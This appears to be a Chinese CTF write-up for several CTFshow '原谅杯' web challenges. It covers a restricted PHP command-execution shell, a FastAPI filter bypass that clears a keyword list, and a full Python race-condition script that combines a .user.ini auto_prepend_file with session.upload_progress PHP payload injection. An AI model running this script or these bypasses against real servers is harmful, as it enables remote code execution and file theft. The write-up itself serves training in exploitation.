---
title: "CTFshow-原谅杯"
date: 2024-03-23
categories: 
  - "ctf"
tags: 
  - "ctf"
---

_前言_ ：练习题目，康复训练

* * *

## 原谅4

```
 <?php isset($_GET['xbx'])?system($_GET['xbx']):highlight_file(__FILE__); 
```

题目给了这一段代码，但是经过测试，只有ls、rm、sh这三个命令能用

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711164713-image.png)

flag在根目录，没有直接读取文件的命令

但是这个sh命令是可以执行文件中的命令的，类似于下图

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711165270-image.png)

当文件中的命令不能被正常执行时候，会抛出command not found的错误

可以使用linux中的重定向错误输出，具体可见下文

- [一篇文章看懂linux的2>$1-CSDN博客](https://blog.csdn.net/funnypython/article/details/83859508)

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711165653-image.png)

重定向之后，错误输出就变成了标准输出，浏览器可以正常显示，于是预期解如下

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711165868-image.png)

由于只是限制了/bin目录下的二进制文件，但是在其他目录下还可能存在其他的命令文件，就存在了非预期，比如说在/usr/local/bin下存在php文件，可以用这个

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711165941-image.png)

尝试直接包含/flag

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711166198-image.png)

## 原谅5\_fastapi2

fastapi存在一个docs接口可以进行交互操作

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711166836-image.png)

题目给出提示过滤

```
['import', 'open', 'eval', 'exec', 'class', '\'', '"', 'vars', 'str', 'chr']
```

使用list查看calc的全局变量如下

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711167641-image.png)

在youdontknow里面存在有过滤的单词和字符

这里可以尝试消去youdontknow里的所有属性

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711168122-image.png)

传入youdontknow.clear()命令之后，再进行list查看全局变量，可以发现waf被覆盖了

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711168160-image.png)

最后使用open read文件操作读取根目录下的flag

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711168375-image.png)

## 原谅6\_web3

```
 <?php
error_reporting(0);
highlight_file(__FILE__);
include('waf.php');
$file = $_GET['file'] ?? NULL;
$content = $_POST['content'] ?? NULL;
(waf_file($file)&&waf_content($content))?(file_put_contents($file,$content)):NULL;
```

对于输入的文件参数有过滤，这道题考察的是修改.user.ini来进行session文件包含

![](https://www.hyhforever.top/wp-content/uploads/2024/03/1711177605-image.png)

但是默认uploadclearup是on，那么上传之后就会立即清空，不过存在条件竞争可能性

- [利用session.upload\_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/202819.html)

根据上文中的脚本进行简单修改

```

import io
import requests
import threading

sessid = 'hyh'
url='http://518a31e6-f1c8-4991-ab71-8a1573952207.challenge.ctf.show/'

def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( url, data={'PHP_SESSION_UPLOAD_PROGRESS': "<?php system('cat ./flag.php');?>"}, files={'file': ('hyh.txt',f)}, cookies={'PHPSESSID': sessid} )

def read(session):
    while True:
        resp = session.get(url + "index.php")
        if "upload_progress" in resp.text:
            print(resp.text)

if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        hyh={
            "content": "auto_prepend_file=/tmp/sess_" + sessid
        }//先写入.user.ini文件
        session.post(url + "?file=.user.ini", data=hyh)
        for i in range(1,30):
            threading.Thread(target=write,args=(session,)).start()
        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()
```

自动包含sess文件之后会对所有文件生效,同时再访问index.php或者waf.php即可看到被包含的flag

## fastapi2 for 阿狸

过滤名单`['import', 'open', 'eval', 'exec', 'class', '\'', '"', 'vars', 'str', 'chr', '%', '_', 'flag','in', '-', 'mro', '[', ']']`

额没什么好说的,跟上面那个一样
